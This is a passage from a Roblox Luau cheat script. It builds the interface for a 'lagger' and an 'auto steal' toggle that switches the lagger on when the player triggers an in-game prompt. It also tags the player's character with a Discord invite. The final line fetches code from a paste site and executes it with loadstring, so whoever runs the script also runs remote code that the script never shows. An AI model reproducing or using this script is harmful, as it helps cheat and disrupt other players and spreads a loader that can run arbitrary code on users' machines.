ConfirmBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ConfirmBtn.BorderSizePixel = 0
ConfirmBtn.Text = "Confirm"
ConfirmBtn.TextColor3 = Color3.fromRGB(5, 5, 5)
ConfirmBtn.TextSize = 13
ConfirmBtn.Font = Enum.Font.GothamBold
ConfirmBtn.AutoButtonColor = false
ConfirmBtn.Parent = ModalBox

local CancelBtn = Instance.new("TextButton")
CancelBtn.Name = "CancelBtn"
CancelBtn.ZIndex = 82
CancelBtn.Position = UDim2.new(1, -128, 1, -52)
CancelBtn.Size = UDim2.new(0, 110, 0, 34)
CancelBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
CancelBtn.BorderSizePixel = 0
CancelBtn.Text = "Cancel"
CancelBtn.TextColor3 = Color3.fromRGB(170, 170, 170)
CancelBtn.TextSize = 13
CancelBtn.Font = Enum.Font.GothamMedium
CancelBtn.AutoButtonColor = false
CancelBtn.Parent = ModalBox

local function formatK(num)
    if num >= 1000 then
        return string.format("%dK", math.floor(num / 1000 + 0.5))
    end
    return tostring(num)
end

local function updateLaggerVisuals()
    if laggerActive then
        StatusText.Text = "WŁĄCZ"
        StatusText.TextColor3 = Color3.fromRGB(50, 220, 50)
        ActivateBtn.Text = "DEACTIVATE"
        ActivateBtn.BackgroundColor3 = Color3.fromRGB(160, 30, 30)
        ActivateBtnStroke.Color = Color3.fromRGB(200, 40, 40)
    else
        StatusText.Text = "WYŁĄCZ"
        StatusText.TextColor3 = Color3.fromRGB(70, 70, 70)
        ActivateBtn.Text = "ACTIVATE"
        ActivateBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
        ActivateBtnStroke.Color = Color3.fromRGB(58, 58, 58)
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    if laggerActive then
        startLag()
    else
        stopLag()
    end
    updateLaggerVisuals()
end

ActivateBtn.MouseButton1Click:Connect(toggleLagger)

SettingsToggleBtn.MouseButton1Click:Connect(function()
    SettingsPanel.Visible = not SettingsPanel.Visible
end)

SettingsCloseBtn.MouseButton1Click:Connect(function()
    SettingsPanel.Visible = false
end)

PowerBox.FocusLost:Connect(function()
    local n = tonumber(PowerBox.Text)
    if n and n > 0 then
        config.power = math.floor(n)
        PowerTag.Text = formatK(config.power)
    else
        PowerBox.Text = tostring(config.power)
        PowerTag.Text = formatK(config.power)
    end
    if laggerActive then
        startLag()
    end
end)

DelayBox.FocusLost:Connect(function()
    local n = tonumber(DelayBox.Text)
    if n and n > 0.01 then
        config.delay = n
    else
        DelayBox.Text = tostring(config.delay)
    end
    if laggerActive then
        startLag()
    end
end)

local function updateAutoStealVisuals()
    if config.autoSteal then
        AutoStealBtn.Text = "WŁĄCZONY"
        AutoStealBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        AutoStealBtn.TextColor3 = Color3.fromRGB(5, 5, 5)
    else
        AutoStealBtn.Text = "WYŁĄCZONY"
        AutoStealBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
        AutoStealBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
    end
end

AutoStealBtn.MouseButton1Click:Connect(function()
    config.autoSteal = not config.autoSteal
    updateAutoStealVisuals()
end)

updateAutoStealVisuals()

KeybindBtn.MouseButton1Click:Connect(function()
    if listeningForKey then return end
    listeningForKey = true
    KeybindBtn.Text = "..."
end)

ClearKeybindBtn.MouseButton1Click:Connect(function()
    config.keybind = nil
    KeybindBtn.Text = "None"
    listeningForKey = false
end)

ControllerBtn.MouseButton1Click:Connect(function()
    if listeningForCtrl then return end
    listeningForCtrl = true
    ControllerBtn.Text = "..."
end)

ClearControllerBtn.MouseButton1Click:Connect(function()
    config.controllerBind = nil
    ControllerBtn.Text = "None"
    listeningForCtrl = false
end)

ResetBtn.MouseButton1Click:Connect(function()
    ConfirmModal.Visible = true
end)

CancelBtn.MouseButton1Click:Connect(function()
    ConfirmModal.Visible = false
end)

ConfirmBtn.MouseButton1Click:Connect(function()
    config.power = 100000
    config.delay = 0.125
    config.keybind = Enum.KeyCode.F
    config.controllerBind = Enum.KeyCode.ButtonR2
    config.autoSteal = true
    setBackground(nil)

    PowerBox.Text = "100000"
    PowerTag.Text = "100K"
    DelayBox.Text = "0.125"
    KeybindBtn.Text = "F"
    ControllerBtn.Text = "ButtonR2"
    updateAutoStealVisuals()

    if laggerActive then
        startLag()
    end
    ConfirmModal.Visible = false
end)

ProximityPromptService.PromptTriggered:Connect(function(prompt, player)
    if player ~= LocalPlayer then return end
    if config.autoSteal and not laggerActive then
        toggleLagger()
    end
end)

local function makeDraggable(frame)
    local isDragging = false
    local dragStart = nil
    local startPos = nil

    frame.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            dragStart = inp.Position
            startPos = frame.Position
            local conn
            conn = inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    isDragging = false
                    conn:Disconnect()
                end
            end)
        end
    end)

    UserInputService.InputChanged:Connect(function(inp)
        if isDragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
            local delta = inp.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

makeDraggable(MainFrame)
makeDraggable(SettingsPanel)

local function createTag()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local head = char:WaitForChild("Head", 5)
    if not head then return end
    if head:FindFirstChild("VenomTag") then head.VenomTag:Destroy() end

    local bb = Instance.new("BillboardGui")
    bb.Name = "VenomTag"
    bb.Size = UDim2.new(0, 300, 0, 30)
    bb.StudsOffset = Vector3.new(0, 3, 0)
    bb.AlwaysOnTop = true
    bb.ResetOnSpawn = false
    bb.Parent = head

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "discord.gg/venomduels"
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 16
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextStrokeTransparency = 0.2
    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    lbl.Parent = bb
end

task.spawn(createTag)
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.5)
    createTag()
    if laggerActive then
        startLag()
    end
end)

UserInputService.InputBegan:Connect(function(inp, gpe)
    if gpe then return end
    if listeningForKey and inp.UserInputType == Enum.UserInputType.Keyboard then
        config.keybind = inp.KeyCode
        KeybindBtn.Text = config.keybind.Name
        listeningForKey = false
        return
    end
    if listeningForCtrl and inp.UserInputType == Enum.UserInputType.Gamepad1 then
        config.controllerBind = inp.KeyCode
        ControllerBtn.Text = config.controllerBind.Name
        listeningForCtrl = false
        return
    end
    if (config.keybind and inp.KeyCode == config.keybind) or (config.controllerBind and inp.KeyCode == config.controllerBind) then
        toggleLagger()
    elseif inp.KeyCode == Enum.KeyCode.RightControl or inp.KeyCode == Enum.KeyCode.Insert then
        ScreenGui.Enabled = not ScreenGui.Enabled
    end
end)

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()